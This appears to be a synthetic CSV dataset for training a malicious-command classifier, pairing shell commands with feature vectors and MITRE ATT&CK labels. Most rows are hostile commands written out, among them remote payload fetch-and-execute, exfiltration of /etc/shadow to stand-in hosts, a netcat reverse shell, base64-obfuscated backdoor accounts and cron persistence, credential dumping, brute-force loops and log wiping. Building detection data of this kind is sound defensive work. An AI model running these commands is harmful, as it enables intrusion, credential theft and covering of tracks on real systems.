command,features,label,source
scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/,"[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
echo  'dw=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
find /var/log -name '*.log' -exec truncate -s 0 {} \;,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1070_Indicator_Removal'],synthetic
time nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1496_Resource_Hijacking'],synthetic
history -c && history -w,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]",['T1070_Indicator_Removal'],synthetic
certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe && > /dev/null 2>&1,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0.0, 0.4, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)' && > /dev/null 2>&1","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.36, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
mimikatz.exe 'sekurlsa::logonpasswords' exit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
systemctl enable --now malicious.service,"[0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1053_Scheduled_Task'],synthetic
strings /proc/*/mem | grep -i password,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1003_OS_Credential_Dumping'],synthetic
time for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.56, 0, 0]",['T1110_Brute_Force'],synthetic
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1110_Brute_Force'],synthetic
"bash -c ""groups $(whoami)""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
nmap -A -T4 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
"time python3 -c ""exec(__import__('base64').b64decode('aW1wb3J0IG9z').decode())""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
useradd -m -s /bin/bash -G sudo newadmin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1098_Account_Manipulation'],synthetic
getent  passwd  |  grep  -v  nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1087_Account_Discovery'],synthetic
curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1496_Resource_Hijacking'],synthetic
echo 'ZWNobyAnYmFja2Rvb3I6eDowOjA6cm9vdDovcm9vdDovYmluL2Jhc2gnID4+IC9ldGMvcGFzc3dk' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'KGNyb250YWIgLWw7IGVjaG8gJyogKiAqICogKiAvdG1wL3BheWxvYWQuc2gnKSB8IGNyb250YWIgLQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo ssh admin@localhost,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1078_Valid_Accounts'],synthetic
for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.52, 0, 0]",['T1110_Brute_Force'],synthetic
echo 'Y3VybCAtc0wgaHR0cDovL2V2aWwuY29tL3htcmlnIHwgYmFzaA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1110_Brute_Force'],synthetic
groups $(whoami),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
sudo echo 'ZWNobyAnQHJlYm9vdCAvdG1wLy54bXIveG1yaWcgLW8gcG9vbC5taW5leG1yLmNvbScgfCBjcm9udGFiIC0=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'd2hv' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
vim /etc/hosts,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
nohup masscan -p1-65535 10.0.0.0/24 --rate=1000 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.24, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
echo 'dXNlcmFkZCAtbSAtcyAvYmluL2Jhc2ggLUcgc3VkbyBuZXdhZG1pbiAmJiBoaXN0b3J5IC1j' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
reg  add  HKLM\Software\Microsoft\Windows\CurrentVersion\Run  /v  Backdoor  /d  C:\payload.exe,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
sh -c 'curl http://evil.com/shell.sh | bash',"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
time sudo -u www-data bash && chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 1]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
./CVE-2021-4034,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
nmap  -sV  --version-intensity  5  -p  1-65535  10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
echo 'ZWNobyAnKi81ICogKiAqICogY3VybCBodHRwOi8vYzIuY29tL2JlYWNvbicgfCBjcm9udGFiIC0=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""git clone https://github.com/user/repo.git""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
echo 'cmVnIGFkZCBIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBCYWNrZG9vciAvZCBDOlxwYXlsb2FkLmV4ZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'cHl0aG9uMyAtYyAiaW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyki' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup nmap -sn 192.168.1.0/24 | sleep 1 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.2, 0.32, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""xfreerdp /u:Administrator /p:Password123 /v:10.0.0.5""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1021_Remote_Services'],synthetic
curl -sL http://evil.com/shell.sh -o /tmp/shell.sh | history -c,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""echo 'Z3JvdXBzICQod2hvYW1pKQ==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'c2ggLWMgJ2N1cmwgaHR0cDovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaCc=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo sudo -u www-data bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo  'Y3VybCAtc0wgaHR0cDovL2V2aWwuY29tL3htcmlnIHwgYmFzaA=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
uptime,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['BENIGN'],synthetic
at now + 1 minute <<< '/tmp/payload' && > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.0, 0.44, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ln  -s  /tmp/backdoor.sh  /etc/cron.d/system-update,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1053_Scheduled_Task'],synthetic
wget --post-file=/etc/passwd http://attacker.com/receive,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
python3 -c 'print(1+1)',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
route -n && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
./CVE-2021-4034,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
sudo net user /add attacker P@ssw0rd,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1136_Create_Account'],synthetic
cat /etc/network/interfaces,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
gcc exploit.c -o exploit && ./exploit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
service apache2 status,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
arp -a && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
mkdir -p /opt/myapp,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
fping -a -g 192.168.1.0/24 2>/dev/null,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup ssh admin@localhost &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo 'ZWNobyAnYUdWc2JHOD0nIHwgYmFzZTY0IC1kIHwgYmFzaA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo 'Y2F0IC9ldGMvc2hhZG93IHwgbmMgMTAuMC4wLjk5IDQ0NDQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
Get-LocalGroupMember -Group Administrators && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bWVkdXNhIC1oIDEwLjAuMC4xIC11IHJvb3QgLVAgL3RtcC9wYXNzd29yZHMudHh0IC1NIHNzaA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1110_Brute_Force', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup locate wp-config.php &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
time ./pwnkit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
curl -X POST http://evil.com/collect -d @/etc/shadow,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
cat /etc/os-release | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time curl -X POST http://evil.com/collect -d @/etc/shadow | > /dev/null 2>&1,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.44, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nc -e /bin/bash attacker.com 80 ; echo done,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nmap -sn 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
pip  install  requests,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
curl  -s  http://c2.attacker.com/beacon,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
echo 'cm0gLXJmIC90bXAvKiAvdmFyL3RtcC8q' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
xfreerdp /u:Administrator /p:Password123 /v:10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
powershell.exe -EncodedCommand JABzA... && chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 1]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo 'PiB+Ly5iYXNoX2hpc3RvcnkgJiYgaGlzdG9yeSAtYw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup nmap --script=vuln 10.0.0.1 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
echo 'c3UgLSBhZG1pbg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""ip addr show""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
sudo ip link show | history -c,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
(crontab -l; echo '* * * * * /tmp/payload.sh') | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.48, 1, 0]",['T1053_Scheduled_Task'],synthetic
nohup whoami &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
whoami,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['BENIGN'],synthetic
nohup nmap -sV --version-intensity 5 -p 1-65535 10.0.0.1 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.36, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
time cat ~/.ssh/id_rsa,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
wmic useraccount list,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1087_Account_Discovery'],synthetic
pwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['BENIGN'],synthetic
cat /etc/passwd | grep -v nologin | grep -v false,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.4, 0.4, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
ssh -L 8080:internal:80 user@jump.host | echo done,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
find /var/log -name '*.log' -exec truncate -s 0 {} \;,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1070_Indicator_Removal'],synthetic
time traceroute google.com,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
nohup echo 'aGVsbG8=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
> ~/.bash_history && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]",['T1070_Indicator_Removal'],synthetic
netstat -tulpn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
echo  'c3UgLXMgL2Jpbi9iYXNoIHd3dy1kYXRh'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo 'bWVkdXNhIC1oIDEwLjAuMC4xIC11IHJvb3QgLVAgL3RtcC9wYXNzd29yZHMudHh0IC1NIHNzaCA7IGVjaG8gZG9uZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo 'JGVudjpjbWQgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCdkd0JvQUc4QVlRQnRBR2tBJykpICYmIHNsZWVwIDE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.52, 0, 0]",['T1110_Brute_Force'],synthetic
time usermod -aG sudo compromised_user | chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 1]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 0, 0]",['T1136_Create_Account'],synthetic
net user /domain && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""echo 'cnVudXNlciAtbCBwb3N0Z3JlcyAtYyAncHNxbCAtYyAiU0VMRUNUIHBnX3JlYWRfZmlsZShcJy9ldGMvcGFzc3dkXCcpIic=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup getent passwd | grep -v nologin &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
time unset HISTFILE; export HISTSIZE=0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1070_Indicator_Removal'],synthetic
sudo wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
"bash -c ""python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
